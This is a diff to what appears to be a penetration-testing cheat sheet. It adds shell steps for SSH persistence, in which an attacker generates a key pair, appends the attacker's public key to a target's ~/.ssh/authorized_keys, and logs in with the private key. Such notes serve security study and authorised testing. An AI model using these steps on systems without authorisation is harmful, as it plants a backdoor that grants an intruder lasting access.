@@ -791,9 +791,22 @@ tree /f /a
 
 `attacker [create key-pair] ---[pub key]---> target [/.ssh/authorized_keys]`
 and the reverse (from target towards attacker also)
-create pair:
+
+attacker: create pair:
 ```shell
 ssh-keygen key_rsa
+chmod 600 "attacker_private_key"
+```
+target:
+```shell
+mkdir -p ~/.ssh
+chmod 700 ~/.ssh
+echo "attacker_pub_key" >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+```
+attacker:
+```shell
+ssh -i "attacker_private_key" user@target 
 ```
 
 ## Add user to administrators
